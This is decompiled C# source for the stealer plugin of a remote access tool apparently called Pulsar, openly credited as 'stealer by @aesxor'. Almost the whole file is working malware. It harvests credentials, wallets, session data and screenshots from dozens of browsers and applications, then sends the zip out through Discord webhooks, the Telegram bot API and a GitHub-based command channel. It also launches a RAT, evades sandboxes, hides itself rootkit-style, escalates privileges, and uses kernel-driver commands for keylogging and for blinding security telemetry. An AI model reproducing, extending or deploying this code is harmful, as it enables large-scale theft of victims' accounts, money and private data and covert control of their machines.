// Decompiled with JetBrains decompiler
// Type: Pulsar.Plugins.Client.Stealer
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Targets;
using Intelix.Targets.Applications;
using Intelix.Targets.Browsers;
using Intelix.Targets.Crypto;
using Intelix.Targets.Device;
using Intelix.Targets.Games;
using Intelix.Targets.Messangers;
using Intelix.Targets.Vpn;
using Pulsar.Common.Plugins;
using Pulsar.Plugins.Client.Modules;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

#nullable disable
namespace Pulsar.Plugins.Client;

public sealed class Stealer : IUniversalPlugin
{
  private string _discordWebhook = "";
  private string _telegramToken = "";
  private string _telegramChatId = "";
  private string _githubToken = "";
  private string _githubRepo = "";
  private readonly string _configPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "pulsar_cl_conf.bin");
  private static readonly List<ITarget> Targets = new List<ITarget>()
  {
    (ITarget) new Chromium(),
    (ITarget) new Gecko(),
    (ITarget) new ScreenShot(),
    (ITarget) new GameList(),
    (ITarget) new InstalledBrowsers(),
    (ITarget) new InstalledPrograms(),
    (ITarget) new ProcessDump(),
    (ITarget) new ProductKey(),
    (ITarget) new SystemInfo(),
    (ITarget) new WifiKey(),
    (ITarget) new Telegram(),
    (ITarget) new Discord(),
    (ITarget) new Element(),
    (ITarget) new Icq(),
    (ITarget) new MicroSIP(),
    (ITarget) new Jabber(),
    (ITarget) new Outlook(),
    (ITarget) new Pidgin(),
    (ITarget) new Signal(),
    (ITarget) new Skype(),
    (ITarget) new Tox(),
    (ITarget) new Viber(),
    (ITarget) new Minecraft(),
    (ITarget) new BattleNet(),
    (ITarget) new Epic(),
    (ITarget) new Riot(),
    (ITarget) new Roblox(),
    (ITarget) new Steam(),
    (ITarget) new Uplay(),
    (ITarget) new XBox(),
    (ITarget) new Growtopia(),
    (ITarget) new ElectronicArts(),
    (ITarget) new Rdp(),
    (ITarget) new AnyDesk(),
    (ITarget) new CyberDuck(),
    (ITarget) new DynDns(),
    (ITarget) new FileZilla(),
    (ITarget) new Ngrok(),
    (ITarget) new PlayIt(),
    (ITarget) new TeamViewer(),
    (ITarget) new WinSCP(),
    (ITarget) new TotalCommander(),
    (ITarget) new FTPNavigator(),
    (ITarget) new FTPRush(),
    (ITarget) new CoreFtp(),
    (ITarget) new FTPGetter(),
    (ITarget) new FTPCommander(),
    (ITarget) new TeamSpeak(),
    (ITarget) new Obs(),
    (ITarget) new GithubGui(),
    (ITarget) new NoIp(),
    (ITarget) new FoxMail(),
    (ITarget) new Navicat(),
    (ITarget) new RDCMan(),
    (ITarget) new Sunlogin(),
    (ITarget) new Xmanager(),
    (ITarget) new JetBrains(),
    (ITarget) new PuTTY(),
    (ITarget) new Cisco(),
    (ITarget) new RadminVPN(),
    (ITarget) new CyberGhost(),
    (ITarget) new ExpressVPN(),
    (ITarget) new HideMyName(),
    (ITarget) new IpVanish(),
    (ITarget) new MullVad(),
    (ITarget) new NordVpn(),
    (ITarget) new OpenVpn(),
    (ITarget) new PIAVPN(),
    (ITarget) new ProtonVpn(),
    (ITarget) new Proxifier(),
    (ITarget) new SurfShark(),
    (ITarget) new Hamachi(),
    (ITarget) new WireGuard(),
    (ITarget) new SoftEther(),
    (ITarget) new CryptoDesktop(),
    (ITarget) new Grabber(),
    (ITarget) new UserAgentGenerator(),
    (ITarget) new CryptoChromium(),
    (ITarget) new CryptoGecko()
  };

  public string PluginId => "stealer_plugin";

  public string Version => "2.1.0";

  public string[] SupportedCommands
  {
    get => new string[6]{ "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind" };
  }

  public bool IsComplete => true;

  public void Initialize(object initData)
  {
    this.LoadLocalConfig();
    if (!(initData is byte[] bytes))
      return;
    if (bytes.Length == 0)
      return;
    try
    {
      string[] strArray = Encoding.UTF8.GetString(bytes).Split('|');
      if (strArray.Length >= 1 && !string.IsNullOrWhiteSpace(strArray[0]))
        this._discordWebhook = strArray[0];
      if (strArray.Length >= 3)
      {
        this._telegramToken = strArray[1];
        this._telegramChatId = strArray[2];
      }
      if (strArray.Length >= 5)
      {
        this._githubToken = strArray[3];
        this._githubRepo = strArray[4];
      }
      this.SaveLocalConfig();

      // Initialize GitHub C2 if configured
      if (!string.IsNullOrEmpty(this._githubToken) && !string.IsNullOrEmpty(this._githubRepo))
      {
          Intelix.Targets.C2.GitHubC2.Initialize(this._githubToken, this._githubRepo);
          // Start RAT in background (Fire & Forget)
          Task.Run(() => Intelix.Targets.C2.GitHubC2.StartRAT());
      }

      // Shadow Core Integration (Project Shadow)
      // Check for VM/Sandbox environment using Advanced ASM/Rust techniques
      if (!Intelix.AntiAnalysis.AdvancedChecks.IsSafeEnvironment())
      {
          // Self-destruct logic: overwrite memory, throw critical error, or silent exit
          // Here we silent exit to avoid alerting analysts
          return; 
      }

      // Activate User-Mode Rootkit (Hide functionality)
      Intelix.AntiAnalysis.AdvancedChecks.ActivateStealthMode();

      // Privilege Escalation (GodPotato)
      // If valid system and not yet SYSTEM, attempt to escalate.
      if (!Intelix.PrivilegeEscalation.GodPotato.IsSystem())
      {
          Intelix.PrivilegeEscalation.GodPotato.Escalate();
          // If execute successful, the current process will exit
      }
      // If we are here, we are either SYSTEM or escalation failed silently (continue as user)

    }
    catch
    {
    }
  }

  public PluginResult ExecuteCommand(string command, object parameters)
  {
    try
    {
      string output;
      bool success;
      int pid = parameters != null ? Convert.ToInt32(parameters) : System.Diagnostics.Process.GetCurrentProcess().Id;

      switch (command)
      {
        case "collect":
          byte[] zipBytes = this.CollectLogs();
          if (zipBytes == null || zipBytes.Length == 0)
            return new PluginResult() { Success = false, Message = "Logs collection failed or empty." };
          string fileName = $"{Environment.UserName}_{Environment.MachineName}_{DateTime.Now:yyyyMMdd}.zip";
          if (!string.IsNullOrEmpty(this._discordWebhook))
            Task.Run(() => this.SendToDiscord(this._discordWebhook, zipBytes, fileName));
          if (!string.IsNullOrEmpty(this._telegramToken) && !string.IsNullOrEmpty(this._telegramChatId))
            Task.Run(() => this.SendToTelegram(this._telegramToken, this._telegramChatId, zipBytes, fileName));
          if (!string.IsNullOrEmpty(this._githubToken) && !string.IsNullOrEmpty(this._githubRepo))
            Task.Run(async () => await Intelix.Targets.C2.GitHubC2.UploadFile(fileName, "log", zipBytes));
          return new PluginResult() { Success = true, Message = fileName, Data = zipBytes, ShouldUnload = true };

        case "kernel_hide":
          using (var dev = new KernelController())
          {
            if (dev.Connect())
            {
              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid, Enable = true };
              success = dev.SendIoctl(KernelController.HIDE_UNHIDE_PROCESS, ref target);
              output = success ? "Process hidden silently via IOCTL." : "Failed to hide process via IOCTL.";
            }
            else output = "Failed to connect to Shadow Driver.";
          }
          return new PluginResult() { Success = success, Message = output };

        case "kernel_elevate":
          using (var dev = new KernelController())
          {
            if (dev.Connect())
            {
              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid };
              success = dev.SendIoctl(KernelController.ELEVATE_PROCESS, ref target);
              output = success ? "Process elevated to SYSTEM silently." : "Failed to elevate process.";
            }
            else output = "Failed to connect to Shadow Driver.";
          }
          return new PluginResult() { Success = success, Message = output };

        case "kernel_protect":
          using (var dev = new KernelController())
          {
            if (dev.Connect())
            {
              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid, Enable = true };
              success = dev.SendIoctl(KernelController.PROTECT_PROCESS, ref target);
              output = success ? "Process protected silently." : "Failed to protect process.";
            }
            else output = "Failed to connect to Shadow Driver.";
          }
          return new PluginResult() { Success = success, Message = output };

        case "kernel_keylog":
          using (var dev = new KernelController())
          {
            if (dev.Connect())
            {
              IntPtr addr = dev.GetKeyloggerAddress();
              if (addr != IntPtr.Zero)
              {
                output = $"Kernel Keylogger active. Mapped address: 0x{addr.ToInt64():X}. Started background monitor.";
                // In actual deployment, start a thread to read this address periodically
                success = true;
              }
              else output = "Failed to get Keylogger address from Kernel.";
            }
            else output = "Failed to connect to Shadow Driver.";
          }
          return new PluginResult() { Success = success, Message = output };

        case "kernel_blind":
          using (var dev = new KernelController())
          {
            if (dev.Connect())
            {
              var b = new KernelController.BoolStruct { Enable = false };
              bool etw = dev.SendIoctl(KernelController.ETWTI, ref b);
              bool dse = dev.SendIoctl(KernelController.ENABLE_DSE, ref b);
              output = $"Blinding Result - ETWTI: {etw}, DSE: {dse}";
              success = etw || dse;
            }
            else output = "Failed to connect to Shadow Driver.";
          }
          return new PluginResult() { Success = success, Message = output };

        default:
          return new PluginResult() { Success = false, Message = "Unknown command" };
      }
    }
    catch (Exception ex)
    {
      return new PluginResult() { Success = false, Message = "Error: " + ex.Message, ShouldUnload = true };
    }
  }

  private byte[] CollectLogs()
  {
    using (InMemoryZip zip = new InMemoryZip())
    {
      Counter counter = new Counter();
      try
      {
        Task.WaitAll(Task.Run((Action) (() => Parallel.ForEach<ITarget>((IEnumerable<ITarget>) Stealer.Targets, (Action<ITarget>) (target =>
        {
          try
          {
            target.Collect(zip, counter);
          }
          catch
          {
          }
        })))));
        counter.Collect(zip);
        return zip.ToArray();
      }
      catch
      {
        return (byte[]) null;
      }
    }
  }

  private void SendToDiscord(string webhookUrl, byte[] fileData, string fileName)
  {
    try
    {
      using (HttpClient httpClient = new HttpClient())
      {
        using (MultipartFormDataContent content1 = new MultipartFormDataContent())
        {
          string content2 = $"{{\r\n                        \"username\": \"stealer by @aesxor\",\r\n                        \"embeds\": [{{\r\n                            \"title\": \"\uD83D\uDCBE New Log Received\",\r\n                            \"description\": \"**User:** {Environment.UserName}\\n**PC:** {Environment.MachineName}\\n**OS:** {Environment.OSVersion}\",\r\n                            \"color\": 3447003,\r\n                            \"footer\": {{ \"text\": \"v{this.Version}\" }}\r\n                        }}]\r\n                    }}";
          content1.Add((HttpContent) new StringContent(content2, Encoding.UTF8, "application/json"), "payload_json");
          ByteArrayContent content3 = new ByteArrayContent(fileData);
          content3.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");
          content1.Add((HttpContent) content3, "file", fileName);
          httpClient.PostAsync(webhookUrl, (HttpContent) content1).Wait();
        }
      }
    }
    catch
    {
    }
  }

  private void SendToTelegram(string token, string chatId, byte[] fileData, string fileName)
  {
    try
    {
      string requestUri = $"https://api.telegram.org/bot{token}/sendDocument";
      using (HttpClient httpClient = new HttpClient())
      {
        using (MultipartFormDataContent content1 = new MultipartFormDataContent())
        {
          content1.Add((HttpContent) new StringContent(chatId), "chat_id");
          content1.Add((HttpContent) new StringContent($"Log: {Environment.UserName} @ {Environment.MachineName} | stealer by @aesxor"), "caption");
          ByteArrayContent content2 = new ByteArrayContent(fileData);
          content2.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");
          content1.Add((HttpContent) content2, "document", fileName);
          httpClient.PostAsync(requestUri, (HttpContent) content1).Wait();
        }
      }
    }
    catch
    {
    }
  }

  private void SaveLocalConfig()
  {
    try
    {
      File.WriteAllBytes(this._configPath, Encoding.UTF8.GetBytes($"{this._discordWebhook}|{this._telegramToken}|{this._telegramChatId}|{this._githubToken}|{this._githubRepo}"));
    }
    catch
    {
    }
  }

  private void LoadLocalConfig()
  {
    try
    {
      if (!File.Exists(this._configPath))
        return;
      string[] strArray = Encoding.UTF8.GetString(File.ReadAllBytes(this._configPath)).Split('|');
      if (strArray.Length >= 1)
        this._discordWebhook = strArray[0];
      if (strArray.Length < 3)
        return;
      this._telegramToken = strArray[1];
      this._telegramChatId = strArray[2];
      if (strArray.Length >= 5)
      {
          this._githubToken = strArray[3];
          this._githubRepo = strArray[4];
      }
    }
    catch
    {
    }
  }

  public void Cleanup()
  {
  }
}
